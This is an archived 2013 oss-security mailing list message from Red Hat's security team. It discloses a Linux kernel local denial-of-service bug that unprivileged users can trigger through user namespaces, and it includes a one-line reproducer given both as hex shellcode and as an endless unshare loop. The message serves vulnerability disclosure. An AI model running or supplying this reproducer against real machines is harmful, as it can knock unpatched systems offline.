X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/06/1
Message-ID: <20130806143148.GG15178@dhcp-25-225.brq.redhat.com>
Date: Tue, 6 Aug 2013 16:31:48 +0200
From: Petr Matousek <pmatouse@...hat.com>
To: security@...nel.org
Cc: oss-security@...ts.openwall.com
Subject: CLONE_NEWUSER local DoS
Content-Type: text/plain; charset=utf-8

Hello,

spender reported [1] a local DoS triggerable by unprivileged user when
user namespaces are enabled (CONFIG_USER_NS).

  [1] https://twitter.com/grsecurity/status/364566062336978944

Reproducer:

b836010000bb00000010cd80ebf2 is for(;;)unshare(1<<28);

Best regards,
-- 
Petr Matousek / Red Hat Security Response Team
